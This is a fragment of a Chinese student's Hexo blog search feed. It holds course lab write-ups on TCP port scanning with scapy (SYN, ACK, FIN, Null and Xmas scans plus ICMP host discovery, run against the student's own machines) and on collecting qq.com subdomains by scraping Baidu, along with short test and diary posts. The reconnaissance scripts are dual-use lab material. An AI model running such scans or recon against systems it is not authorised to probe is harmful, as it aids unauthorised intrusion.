    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 2-端口扫描实验</h1><p><em>使用win11尝试多次，主机扫描都没有成功，所以最后还是选择使用Linux</em><br><em>可能有图文不符的情况，注意辨别</em></p><hr><h3 id="实验环境">实验环境</h3><ul><li>Ubuntu 20.04</li><li>Python 3.8.10</li></ul><h3 id="实验内容">实验内容</h3><!-- ​本次实验主要对主机扫描和端口扫描原理的理解。使用Python(scapy库)编写端口扫描程序，对目标IP（包含IP地址段）进行扫描，完成以下功能：1. 使用ICMP协议探测主机是否开启；2. 对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较。3. 对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与2进行比较，分析结果。 --><p><s>删掉啦</s></p><hr><h3 id="实验步骤">实验步骤</h3><h4 id="相关库安装">相关库安装</h4><ol><li><p>一开始的时候没有IPy和scapy的库：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091350397.png" alt=""></p></li><li><p>安装ipy</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091356379.png" alt="image-20240929171343944"></p></li><li><p>运行后报错没有scapy的库</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091402421.png" alt=""></p></li><li><p>安装scapy</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091406580.png" alt=""></p></li><li><p><strong>安装nmap</strong></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091415966.png" alt=""></p></li></ol><hr><h4 id="使用ICMP协议进行主机扫描">使用ICMP协议进行主机扫描</h4><ol><li><p>在本机中查看虚拟机第一张网卡的广播地址：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091422513.png" alt=""></p></li><li><p>修改脚本中的dest变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091429939.png" alt=""></p></li><li><p>运行脚本，<strong>主机扫描成功</strong>！</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091434988.png" alt=""></p></li></ol><hr><h4 id="对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较">对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较</h4><ol><li><p>首先使用nmap对本机进行扫描，可知本机开放的端口：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091443392.png" alt=""></p></li><li><p>查看本机的防火墙状态，可以发现已经是关闭的了：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091449083.png" alt=""></p></li></ol><hr><h5 id="开始实验！">开始实验！</h5><h5 id="半连接SYN扫描">半连接SYN扫描</h5><ol><li><p>修改脚本如下，发送SYN包，若未接到任何应答包，则说明端口被关闭；若收到SYN-ACK包，则说明端口开放。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091454283.png" alt=""></p></li><li><p>对开放端口 <strong>80端口</strong> 扫描结果：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091500475.png" alt=""></p></li><li><p>对不开放端口 <strong>79端口</strong> 扫描结果：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091509397.png" alt=""></p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091514966.png" alt=""></p></li></ol><hr><h5 id="ACK扫描">ACK扫描</h5><ol><li><p>**ACK扫描并不能返回端口是否开放。**修改脚本如下，发送ACK包，若未接到任何应答包，则说明端口被关闭；若收到RST包，则说明端口开放。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091521363.png" alt=""></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091527225.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091535131.png" alt=""></p></li></ol><h5 id="FIN扫描">FIN扫描</h5><ol><li><p>修改脚本如下，发送FIN包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091544212.png" alt=""></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091550374.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091555848.png" alt=""></p></li></ol><hr><h5 id="Null扫描">Null扫描</h5><ol><li><p>修改脚本如下，发送空包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091602598.png" alt=""></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091608932.png" alt=""></p></li><li><p>对关闭端口 <strong>3000端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091614165.png" alt=""></p></li></ol><hr><h5 id="Xmas扫描">Xmas扫描</h5><ol><li><p>修改脚本如下，发送FIN PSH URG包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091621015.png" alt=""></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091626515.png" alt=""></p></li><li><p>对关闭端口 3000端口 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091632686.png" alt=""></p></li></ol><hr><h4 id="对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描">对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描</h4><ol><li><p>开启物理机的防火墙：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091639696.png" alt=""></p></li><li><p>物理机的以太网ip：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091646396.png" alt=""></p></li><li><p>修改脚本中的dest变量：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091653032.png" alt=""></p></li></ol><hr><h5 id="半连接SYN扫描-v2">半连接SYN扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描，能够扫描到主机，但是端口是不开放的：<img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091659494.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091704902.png" alt=""></p></li></ol><hr><h5 id="ACK扫描-v2">ACK扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091711408.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091717405.png" alt=""></p></li></ol><hr><h5 id="FIN扫描-v2">FIN扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091724189.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091730871.png" alt=""></p></li></ol><hr><h5 id="Null扫描-v2">Null扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091737262.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091743022.png" alt=""></p></li></ol><hr><h5 id="Xmas扫描-v2">Xmas扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091749726.png" alt=""></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091755490.png" alt=""></p></li></ol><hr><h4 id="源代码">源代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> IPy <span class="hljs-keyword">import</span> IP <span class="hljs-keyword">as</span> IPY<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, TCP, ICMP<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">通过设置flags位为&#x27;*&#x27;,根据不同的扫描方式修改‘*’的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># conf.L3socket=L3RawSocket</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">port_scan</span>(<span class="hljs-params">ip, port</span>):<br>    p = IP(dst=ip) / TCP(dport=<span class="hljs-built_in">int</span>(port), flags=<span class="hljs-string">&quot;FPU&quot;</span>)<br>    ans = sr1(p, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(ans)<br>    <span class="hljs-comment"># print(type(ans))</span><br><br>    <span class="hljs-keyword">if</span> ans == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(ip, <span class="hljs-string">&quot;port&quot;</span>, port, <span class="hljs-string">&quot;is open.&quot;</span>)<br>    <span class="hljs-keyword">elif</span> ans[TCP].flags == <span class="hljs-string">&#x27;RA&#x27;</span>:<br>        <span class="hljs-comment"># ans.display()</span><br>        <span class="hljs-built_in">print</span>(ip, <span class="hljs-string">&quot;port&quot;</span>, port, <span class="hljs-string">&quot;is closed.&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ping</span>(<span class="hljs-params">dest</span>):<br>    ip_addr = IPY(dest)<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ip_addr:<br>        <span class="hljs-built_in">print</span>(ip)<br>        packet = IP(dst=<span class="hljs-built_in">str</span>(ip)) / ICMP() / <span class="hljs-string">b&#x27;rootkit&#x27;</span><span class="hljs-comment">#需要先构造IP协议包</span><br>        ping = sr1(packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ping:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[0;32;47m\t&quot;</span>+<span class="hljs-built_in">str</span>(ip) + <span class="hljs-string">&quot; is up!&quot;</span>+<span class="hljs-string">&quot;\033[0m&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ip) + <span class="hljs-string">&quot; is down!&quot;</span>)<br><br><br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># 根据你的环境需改IP地址和端口</span><br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dest = <span class="hljs-string">&#x27;169.254.134.154&#x27;</span><br>    port = <span class="hljs-number">79</span><br>    Ping(dest)<br>    port_scan(dest, port)<br></code></pre></td></tr></table></figure><hr><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 1</title>
    <link href="/2024/12/26/lab1/"/>
    <url>/2024/12/26/lab1/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1>Lab 1-子域名收集实验</h1><h3 id="实验环境">实验环境</h3><ul><li>Windows 11</li><li>Python 3.7</li></ul><h3 id="实验内容">实验内容</h3><!-- ​本次实验主要考察大家的编程能力及子域名的信息收集方法，在文件夹 “Lab1_code” 提供了使用Bing搜索引擎的域名收集功能。请对该代码进行扩展，使其可支持百度搜索引擎的域名收集功能。需要实现如下功能：1. 支持百度搜索引擎的域名提取，其中从百度搜索引擎提取的域名需为真实域名，而非百度的域名跳转链接；2. 可扩充其他功能，比如域名所在的标题等信息。 --><p><s>删掉啦</s></p><hr><h3 id="实验步骤">实验步骤</h3><h4 id="收集子域名">收集子域名</h4><ol><li><p>运行Sub_Domin_Search.py文件，可以在bing搜索时得到qq的子域名；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226090953460.png" alt=""></p></li><li><p>查看baidu搜索界面的源代码，发现子域名可以在带有result类的div标签下，查找mu标签找到；</p></li><li><p>而子域名的name可以在该div标签下的a标签中，读取a标签中的字符串即可得到子域名的名字；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091005356.png" alt=""></p></li><li><p>修改代码中的处理方式，读取子域名link与子域名中的name；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091012033.png" alt=""></p></li><li><p>修改accept和cookie：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091026573.png" alt=""></p></li><li><p>修改headers中的user-agent:</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091035681.png" alt=""></p></li><li><p>将referer修改为’<a href="https://wappass.baidu.com/">https://wappass.baidu.com/</a>'；</p></li><li><p>修改请求的url，图上标红的两个皆可（是一样的）：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091043604.png" alt=""></p></li><li><p>最终修改后的结果为：</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091049214.png" alt=""></p></li></ol><hr><h4 id="扩展内容（添加网址名、状态码和真实子域名）">扩展内容（添加网址名、状态码和真实子域名）</h4><ol><li><p>如果返回的状态码是302，则说明重定向了，就使用requests库，读取该网址headers中的真实网址；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091054518.png" alt=""></p></li></ol><hr><h4 id="结果">结果</h4><ol><li><p>返回结果中有网址名、子域名url（可能重定向）、状态码和真实子域名；</p><p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226091059794.png" alt=""></p></li></ol><hr><h4 id="源码">源码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 本次实验内容主要为：收集qq.com域名下的子域名，</span><br><span class="hljs-comment"># 收集方法为使用baidu搜索引擎，采用爬手段，爬取搜索到的域名</span><br><span class="hljs-comment"># baidu搜索引擎搜索子域名的语法为：domain:qq.com</span><br><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于请求网页</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup  <span class="hljs-comment"># 用于处理获取的到的网页源码数据</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse  <span class="hljs-comment"># 用于处理url</span><br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-comment"># 定义一个采用baidu搜索的方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baidu_search</span>():<br>    Subdomain = []  <span class="hljs-comment"># 定义一个空列表用于存储收集到的子域名</span><br>    <span class="hljs-comment"># 定义请求头，绕过反爬机制</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 SLBrowser/8.0.1.4031 SLBChan/103&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,<br>        <span class="hljs-string">&#x27;referer&#x27;</span>: <span class="hljs-string">&#x27;https://wappass.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27; 更改为cookie &#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 定义请求url</span><br>    <span class="hljs-comment"># 搜索domain:qq.com后，得到的url</span><br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;tn=48021271_74_hao_pg&amp;wd=domain%3Aqq.com&amp;rsv_spt=1&amp;oq=site%2526lt%253B%2526lt%253BAqq.com&amp;rsv_pq=d10645db019102b5&amp;rsv_t=7550XiQnu5rij1O%2Bj%2F07K20DTPK9MBXAaBDNF621tU1uSsI73hDN7jIoGlNCYVQCw6uadikYZaU7&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=th_1&amp;rsv_sug3=2&amp;rsv_sug1=1&amp;rsv_sug7=001&amp;rsv_sug2=0&amp;rsv_btype=t&amp;rsp=1&amp;rsv_sug9=es_0_1&amp;inputT=2967&amp;rsv_sug4=3014&amp;rsv_sug=4&#x27;</span><br>    <span class="hljs-comment"># 访问url，获取网页源码</span><br>    <span class="hljs-comment"># 找到隐藏的真实域名</span><br>    <span class="hljs-comment"># 不允许重定向</span><br><br>    resp = requests.get(url, headers=headers)<br>    soup = BeautifulSoup(resp.content,<br>                         <span class="hljs-string">&#x27;html.parser&#x27;</span>)  <span class="hljs-comment"># 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，</span><br>    job_bt = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&quot;result&quot;</span>)  <span class="hljs-comment"># find_all()查找源码中所有&lt;h2&gt;标签的内容</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> job_bt:<br>        <span class="hljs-comment"># print(div)</span><br>        link = i.get(<span class="hljs-string">&#x27;mu&#x27;</span>)<br>        name = i.a.string<br><br>        <span class="hljs-comment"># 循环获取‘href’的内容</span><br>        <span class="hljs-comment"># urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置</span><br>        domain = <span class="hljs-built_in">str</span>(urlparse(link).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(link).netloc)<br>        <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">in</span> Subdomain:  <span class="hljs-comment"># 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(name)<br>            Subdomain.append(domain)<br>            <span class="hljs-built_in">print</span>(domain)<br>            r = requests.get(domain, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-built_in">print</span>(r.status_code)<br>            <span class="hljs-comment"># real = r.content.replace(&#x27;\r&#x27;, &#x27;&#x27;).replace(&#x27;In&#x27;,&#x27;&#x27;).replace(&#x27;\t&#x27;, &#x27;&#x27;)</span><br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">302</span>:  <span class="hljs-comment"># 如果返回302，就从响应头获取真实地址</span><br>                real_url = r.headers.get(<span class="hljs-string">&#x27;Location&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 否则从返回内容中用正则表达式提取出来真实地址</span><br>                <span class="hljs-comment"># real_url = re.findall(&quot;href=&#x27;(.*?)&#x27;&quot;, r.text)[0]</span><br>                <span class="hljs-keyword">try</span>:<br>                    real_url = re.findall(<span class="hljs-string">&quot;URL=&#x27;(.*?)&#x27;&quot;</span>, r.text)[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">except</span> IndexError:<br>                    real_url = <span class="hljs-string">&#x27;同上&#x27;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_url is:&#x27;</span>, real_url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>baidu_search()<br></code></pre></td></tr></table></figure><h3 id="实验总结">实验总结</h3><p><s>删掉啦</s></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SEED-Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>why</title>
    <link href="/2024/12/25/why/"/>
    <url>/2024/12/25/why/</url>
    
    <content type="html"><![CDATA[<p>为什么我没有把首页图片改成功？</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>today</title>
    <link href="/2024/09/01/today/"/>
    <url>/2024/09/01/today/</url>
    
    <content type="html"><![CDATA[<p>开学了好想趋势，上着第一天早八就有诡异的清醒</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>First</title>
    <link href="/2024/08/28/first/"/>
    <url>/2024/08/28/first/</url>
    
    <content type="html"><![CDATA[<h1>简介</h1><p>我的第一篇</p><p>–</p><p>test 2025/04/09</p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>post</title>
    <link href="/2024/08/28/post/"/>
    <url>/2024/08/28/post/</url>
    
    <content type="html"><![CDATA[<p>Hello World!</p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/08/28/hello-world/"/>
    <url>/2024/08/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
